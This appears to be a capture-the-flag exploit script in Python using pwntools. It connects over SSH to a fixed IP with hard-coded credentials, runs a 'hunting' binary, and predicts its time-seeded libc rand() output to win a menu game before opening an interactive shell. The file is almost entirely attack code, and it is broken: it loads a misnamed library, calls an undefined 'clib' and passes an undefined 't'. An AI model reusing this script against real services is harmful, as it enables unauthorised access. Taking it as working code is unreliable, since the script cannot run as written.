from pwn import * 
import os
import time
from ctypes import *
def check(t):
  rand = libc.rand()
  if int(rand) == 1:
    return 3
  elif int(rand) == 2:
    return 2
  elif int(rand) == 0 or int(rand) == 3:
    return 1
k = ssh(host='110.10.212.133',user='hunting',port=5555,password='hunting')
s = k.process(['./hunting'])
libc = CDLL("libc.libdy")
libc.srand(clib.time(0))

for i in xrange(20):
  s.recvuntil(':')
  s.send('2\n')
  s.recvuntil('=======================================')
  r = check(t) 
  print r
  r = check(t)
  print r
  s.send(str(r)+'\n')
s.interactive()
